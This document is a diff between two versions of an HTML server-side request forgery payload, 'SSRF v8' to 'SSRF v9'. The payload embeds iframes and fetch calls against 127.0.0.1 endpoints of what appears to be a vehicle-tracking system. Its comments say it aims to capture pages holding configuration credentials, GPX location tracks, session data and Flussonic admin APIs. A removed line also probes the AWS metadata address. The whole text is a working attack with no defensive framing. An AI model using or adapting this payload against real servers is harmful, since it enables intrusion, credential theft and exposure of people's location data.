@@ -10,53 +10,41 @@ pre{white-space:pre-wrap;font-size:5.5px;background:#f5f5f5;padding:1px;word-bre
 </style>
 </head>
 <body>
-<b>SSRF v8 - Flussonic + Internal deep</b>
+<b>SSRF v9 - Generate + GPX from localhost</b>
 
-<!-- Flussonic admin panel - LARGE to capture SPA render -->
-<div class="s"><h3>Flussonic /admin/</h3>
-<iframe style="height:400px" src="https://127.0.0.1/flussonic/admin/"></iframe></div>
+<!-- cmd=generate from localhost - full HTML with global_conf credentials -->
+<div class="s"><h3>cmd=generate FROM LOCALHOST (full HTML with creds)</h3>
+<iframe style="height:500px" src="https://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-01-02"></iframe></div>
 
-<!-- Flussonic API versions -->
-<div class="s"><h3>Flussonic /api/v3/streams</h3>
-<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/v3/streams"></iframe></div>
+<!-- GPX file from localhost -->
+<div class="s"><h3>GPX track_id=1 FROM LOCALHOST</h3>
+<iframe style="height:200px" src="https://127.0.0.1/ax/get_gpx_file.php?track_id=1&node=3"></iframe></div>
 
-<div class="s"><h3>Flussonic /api/v2/media</h3>
-<iframe style="height:80px" src="https://127.0.0.1/flussonic/api/v2/media"></iframe></div>
-
-<div class="s"><h3>Flussonic /api/server</h3>
-<iframe style="height:80px" src="https://127.0.0.1/flussonic/api/server"></iframe></div>
-
-<div class="s"><h3>Flussonic /flussonic/ root</h3>
-<iframe style="height:80px" src="https://127.0.0.1/flussonic/"></iframe></div>
-
-<!-- Login page (known to render) - detailed view -->
-<div class="s"><h3>/ (root login)</h3>
-<iframe style="height:300px" src="https://127.0.0.1/"></iframe></div>
-
-<!-- Key PHP endpoints with node=3 -->
-<div class="s"><h3>/ax/reports.php?node=3</h3>
-<iframe style="height:120px" src="https://127.0.0.1/ax/reports.php?node=3"></iframe></div>
-
-<div class="s"><h3>/backend/ax/init.php</h3>
-<iframe style="height:120px" src="https://127.0.0.1/backend/ax/init.php"></iframe></div>
-
-<div class="s"><h3>/ax/init.php</h3>
-<iframe style="height:80px" src="https://127.0.0.1/ax/init.php"></iframe></div>
-
-<div class="s"><h3>/backend/ax/session.php</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/ax/session.php"></iframe></div>
-
-<div class="s"><h3>/backend/ax/current_data.php?node=3</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/ax/current_data.php?node=3"></iframe></div>
-
-<div class="s"><h3>/backend/ax/get_gpx_file.php?track_id=1&amp;node=3</h3>
+<div class="s"><h3>GPX track_id=1 /backend/ path</h3>
 <iframe style="height:100px" src="https://127.0.0.1/backend/ax/get_gpx_file.php?track_id=1&node=3"></iframe></div>
 
-<div class="s"><h3>/backend/ax/export.php?node=3</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/export.php?node=3"></iframe></div>
+<!-- reports.php from localhost (used internally by cmd=generate) -->
+<div class="s"><h3>/ax/reports.php?node=3 FROM LOCALHOST</h3>
+<iframe style="height:200px" src="https://127.0.0.1/ax/reports.php?node=3"></iframe></div>
 
-<!-- HTTP fetch results for port 8080 -->
-<div class="s"><h3>PORT 8080 + FLUSSONIC FETCH</h3>
+<!-- Login page full details -->
+<div class="s"><h3>/ (root) FROM LOCALHOST</h3>
+<iframe style="height:300px" src="https://127.0.0.1/"></iframe></div>
+
+<!-- init.php with query params -->
+<div class="s"><h3>/backend/ax/init.php?node=3</h3>
+<iframe style="height:150px" src="https://127.0.0.1/backend/ax/init.php?node=3"></iframe></div>
+
+<!-- Try logo.php which might reveal tenant info -->
+<div class="s"><h3>/backend/logo.php</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/logo.php"></iframe></div>
+
+<!-- favicon shows branding -->
+<div class="s"><h3>/backend/favicon.php</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/favicon.php"></iframe></div>
+
+<!-- Port 8080 deep scan results -->
+<div class="s"><h3>FETCH RESULTS</h3>
 <pre id="r">scanning...</pre></div>
 
 <script>
@@ -64,42 +52,30 @@ var o='';
 function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
 
 async function tf(l,u){
-try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,200))}
+try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,300))}
 catch(e){p(l+' ERR: '+e.message)}
 }
 
 (async function(){
-// Port 8080 - Flussonic typical ports
+// Port 8080 with various content types
 await tf('8080:/','http://127.0.0.1:8080/');
-await tf('8080:flus','http://127.0.0.1:8080/flussonic/');
-await tf('8080:fl-api','http://127.0.0.1:8080/flussonic/api/server');
-await tf('8080:fl-str','http://127.0.0.1:8080/flussonic/api/streams');
-await tf('8080:fl-v3','http://127.0.0.1:8080/flussonic/api/v3/streams');
-await tf('8080:fl-cfg','http://127.0.0.1:8080/flussonic/api/read_config');
-await tf('8080:fl-adm','http://127.0.0.1:8080/flussonic/admin/');
-
-// Port 80 Flussonic
-await tf('80:fl','http://127.0.0.1:80/flussonic/');
-await tf('80:fl-api','http://127.0.0.1:80/flussonic/api/server');
-
-// Try Flussonic default port 8080 with various API paths
-await tf('8080:media','http://127.0.0.1:8080/media');
-await tf('8080:cam','http://127.0.0.1:8080/cam1');
-await tf('8080:live','http://127.0.0.1:8080/live');
-await tf('8080:play','http://127.0.0.1:8080/play');
-await tf('8080:dash','http://127.0.0.1:8080/dashboard');
-await tf('8080:rbt','http://127.0.0.1:8080/robots.txt');
-await tf('8080:stat','http://127.0.0.1:8080/stat');
-
-// AWS metadata (one more try)
-await tf('AWS','http://169.254.169.254/latest/meta-data/');
+await tf('8080:idx','http://127.0.0.1:8080/index.html');
+await tf('8080:idx2','http://127.0.0.1:8080/index.php');
+await tf('8080:app','http://127.0.0.1:8080/app');
+await tf('8080:ws','http://127.0.0.1:8080/ws');
+await tf('8080:websocket','http://127.0.0.1:8080/websocket');
+await tf('8080:socket.io','http://127.0.0.1:8080/socket.io/');
+await tf('8080:wss','http://127.0.0.1:8080/wss');
+await tf('8080:gps','http://127.0.0.1:8080/gps');
+await tf('8080:track','http://127.0.0.1:8080/track');
+await tf('8080:data','http://127.0.0.1:8080/data');
+await tf('8080:api/gps','http://127.0.0.1:8080/api/gps');
+await tf('8080:api/track','http://127.0.0.1:8080/api/track');
+await tf('8080:api/data','http://127.0.0.1:8080/api/data');
+await tf('8080:pilot','http://127.0.0.1:8080/pilot');
+await tf('8080:backend','http://127.0.0.1:8080/backend');
 
 p('DONE');
 })();
-
-// Redirect to Flussonic admin after 40s for full page capture
-setTimeout(function(){
-  window.location.href = 'https://127.0.0.1/flussonic/admin/';
-}, 40000);
 </script>
 </body></html>
